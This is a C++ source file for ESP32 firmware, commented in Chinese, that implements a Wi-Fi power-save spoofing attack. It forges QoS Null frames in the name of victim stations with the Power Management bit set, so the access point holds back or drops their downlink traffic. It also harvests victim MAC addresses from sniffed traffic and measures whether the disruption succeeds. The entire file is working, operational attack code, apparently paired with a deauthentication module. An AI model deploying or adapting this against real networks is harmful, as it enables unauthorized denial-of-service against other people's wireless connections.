// 伪造单播 QoS Null（data subtype 12）冒充受害者回 AP，靠 PM 位抢 AP 对该站的省电状态。
// 帧、节奏、边界都写在 qosnull.h 里，这里只说实现。

#include "qosnull.h"

#include <Arduino.h>
#include <WiFi.h>
#include <esp_wifi.h>
#include <string.h>

#include "deauth.h"
#include "radio.h"
#include "tx_guard.h"

namespace {

// 10 帧/秒。20 帧/秒时这类短帧几百帧就把 32 个帧池抽干，整板重启（实测）。
const uint32_t kSendMs = 100;
const int kMaxClients = 8;
// 每 6 帧插一个 PM=0，把"延迟"变成"丢包"。
const uint32_t kFlushEvery = 6;
// QoS Control 里的 TID：0 是 mac80211 给 nullfunc 的选择，也是每个 WMM AP 都认的。
const uint8_t kQosTid = 0;

qosnull_mode_t s_mode = QOSNULL_OFF;
uint8_t s_bssid[6];
uint8_t s_channel;
int32_t s_chan_err;
uint32_t s_last_tx_ms;
int s_cursor;
uint32_t s_tick;

uint32_t s_frames;
uint32_t s_pm1_frames;
uint32_t s_pm0_frames;
uint32_t s_dl_frames;
uint32_t s_rx_nulls;
uint32_t s_rx_pm1;

struct client_t {
    uint8_t mac[6];
    uint32_t sent;
};

client_t s_clients[kMaxClients];
int s_client_count;

int find_client(const uint8_t* mac) {
    for (int i = 0; i < s_client_count; i++) {
        if (memcmp(s_clients[i].mac, mac, 6) == 0) {
            return i;
        }
    }
    return -1;
}

bool is_group(const uint8_t* mac) {
    return (mac[0] & 0x01) != 0;
}

int note_client(const uint8_t* mac) {
    if (mac == nullptr || is_group(mac) || memcmp(mac, s_bssid, 6) == 0) {
        return -1;
    }
    const int found = find_client(mac);
    if (found >= 0) {
        return found;
    }
    if (s_client_count >= kMaxClients) {
        return -1;
    }
    memset(&s_clients[s_client_count], 0, sizeof(client_t));
    memcpy(s_clients[s_client_count].mac, mac, 6);
    return s_client_count++;
}

// 24 字节头 + 2 字节 QoS Control，无 payload。ToDS=1，RA 是 AP，TA 是被冒充的 STA。
size_t build_qos_null(uint8_t* frame, const uint8_t sta[6], bool pm) {
    memset(frame, 0, 26);
    frame[0] = 0xC8;                                 // data / QoS Null
    frame[1] = (uint8_t)(0x01 | (pm ? 0x10 : 0x00));  // ToDS + Power Management
    memcpy(frame + 4, s_bssid, 6);   // Addr1 = RA = AP
    memcpy(frame + 10, sta, 6);      // Addr2 = TA = 受害者
    memcpy(frame + 16, s_bssid, 6);  // Addr3 = DA = AP
    frame[22] = 0xF0;                // seq 固定：这一帧不靠序号做任何事
    frame[23] = 0xFF;
    // QoS Control：TID 低 4 位，ack policy 00（normal），不做 A-MSDU
    frame[24] = (uint8_t)(kQosTid & 0x0F);
    frame[25] = 0x00;
    return 26;
}

}  // namespace

bool qosnull_start(int index, const uint8_t* sta) {
    const uint8_t* bssid = WiFi.BSSID(index);
    if (bssid == nullptr) {
        return false;
    }
    memcpy(s_bssid, bssid, 6);
    s_channel = WiFi.channel(index);
    s_mode = QOSNULL_PM;
    s_last_tx_ms = 0;
    s_cursor = 0;
    s_tick = 0;
    s_frames = 0;
    s_pm1_frames = 0;
    s_pm0_frames = 0;
    s_dl_frames = 0;
    s_rx_nulls = 0;
    s_rx_pm1 = 0;
    s_client_count = 0;
    if (sta != nullptr) {
        note_client(sta);
    }

    // SCAN 刚收尾时改信道可能被拒，帧就会发在别的信道上、打到隔壁网络。错误要报出去。
    s_chan_err = (int32_t)radio_set_channel("qosnull", s_channel);
    // 受害者从嗅探来，qndl 也一样。
    attack_sniffer_enable();
    return true;
}

void qosnull_stop(void) {
    s_mode = QOSNULL_OFF;
}

void qosnull_add_station(const uint8_t mac[6]) {
    note_client(mac);
}

void qosnull_release(void) {
    for (int i = 0; i < s_client_count; i++) {
        uint8_t frame[32];
        const size_t len = build_qos_null(frame, s_clients[i].mac, false);
        // 单播闸门可能还在给上一帧计时，重试几次，别让善后静默失败
        for (int attempt = 0; attempt < 8; attempt++) {
            if (tx_guard_send(frame, (uint16_t)len) == ESP_OK) {
                s_frames++;
                s_pm0_frames++;
                s_clients[i].sent++;
                break;
            }
            delay(25);
        }
    }
    s_mode = QOSNULL_OFF;
}

void qosnull_step(void) {
    if (s_mode == QOSNULL_OFF || s_client_count == 0) {
        return;
    }
    const uint32_t now = millis();
    if (s_last_tx_ms != 0 && now - s_last_tx_ms < kSendMs) {
        return;
    }
    // 一 tick 一帧，轮着来：注入预算是整块射频的，不是每个受害者各一份
    client_t* c = &s_clients[s_cursor % s_client_count];
    s_last_tx_ms = now;

    s_tick++;
    const bool pm = (s_tick % kFlushEvery) != 0;
    uint8_t frame[32];
    const size_t len = build_qos_null(frame, c->mac, pm);
    if (tx_guard_send(frame, (uint16_t)len) == ESP_OK) {
        s_frames++;
        c->sent++;
        if (pm) {
            s_pm1_frames++;
        } else {
            s_pm0_frames++;
        }
        s_cursor++;
    }
}

void qosnull_on_rx(const uint8_t* frame, uint16_t len, uint8_t type, uint8_t subtype) {
    if (s_mode == QOSNULL_OFF || len < 16) {
        return;
    }
    const uint8_t* dest = frame + 4;
    const uint8_t* src = frame + 10;

    // Association / Reassociation Response：刚连上的站是最现成的受害者，AID 也在里面
    if (type == 0 && (subtype == 1 || subtype == 3) && len >= 30 &&
        memcmp(src, s_bssid, 6) == 0) {
        note_client(dest);
        return;
    }

    if (type != 2) {
        return;
    }

    // 发往受害者的下行数据：AP 还在给它发，说明伪造的 PM 状态没生效
    if (find_client(dest) >= 0) {
        s_dl_frames++;
    }
    // 本 BSS 的上行数据：这个站在说话，既是受害者候选，也是嗅探开晚了时唯一的 MAC 来源
    if (memcmp(dest, s_bssid, 6) == 0 || memcmp(frame + 16, s_bssid, 6) == 0) {
        note_client(src);
    }
    // 受害者自己的 Null / QoS Null：它自己的 PM 跳变，会盖掉我们拨的状态
    if ((subtype == 4 || subtype == 12) && find_client(src) >= 0) {
        s_rx_nulls++;
        if ((frame[1] & 0x10) != 0) {
            s_rx_pm1++;
        }
    }
}

void qosnull_selftest(void) {
    static const uint8_t placeholder[6] = {0x02, 0x11, 0x22, 0x33, 0x44, 0x55};
    static const uint8_t fake_sta[6] = {0x02, 0xAA, 0xBB, 0xCC, 0xDD, 0xEE};
    if (s_bssid[0] == 0 && s_bssid[1] == 0 && s_bssid[2] == 0) {
        memcpy(s_bssid, placeholder, 6);
    }

    uint8_t frame[32];
    for (int pm = 1; pm >= 0; pm--) {
        const size_t len = build_qos_null(frame, fake_sta, pm != 0);
        Serial.printf("QOSNULLTEST pm=%u len=%u fc=0x%02X%02X tods=%u tid=%u"
                      " ra=%02X:%02X:%02X ta=%02X:%02X:%02X da=%02X:%02X:%02X\n",
                      (unsigned)((frame[1] & 0x10) != 0), (unsigned)len, (unsigned)frame[1],
                      (unsigned)frame[0], (unsigned)(frame[1] & 0x01),
                      (unsigned)(frame[24] & 0x0F), (unsigned)frame[4], (unsigned)frame[5],
                      (unsigned)frame[6], (unsigned)frame[10], (unsigned)frame[11],
                      (unsigned)frame[12], (unsigned)frame[16], (unsigned)frame[17],
                      (unsigned)frame[18]);
        Serial.print("QOSNULLTEST hex=");
        for (size_t i = 0; i < len; i++) {
            Serial.printf("%02X", frame[i]);
        }
        Serial.println();
    }
}

bool qosnull_active(void) {
    return s_mode != QOSNULL_OFF;
}

const char* qosnull_mode_name(void) {
    return s_mode == QOSNULL_PM ? "pm" : "off";
}

uint32_t qosnull_frames(void) {
    return s_frames;
}

uint32_t qosnull_pm1_frames(void) {
    return s_pm1_frames;
}

uint32_t qosnull_pm0_frames(void) {
    return s_pm0_frames;
}

uint32_t qosnull_clients(void) {
    return (uint32_t)s_client_count;
}

uint32_t qosnull_dl_frames(void) {
    return s_dl_frames;
}

uint32_t qosnull_rx_nulls(void) {
    return s_rx_nulls;
}

uint32_t qosnull_rx_pm1(void) {
    return s_rx_pm1;
}

int32_t qosnull_channel_err(void) {
    return s_chan_err;
}
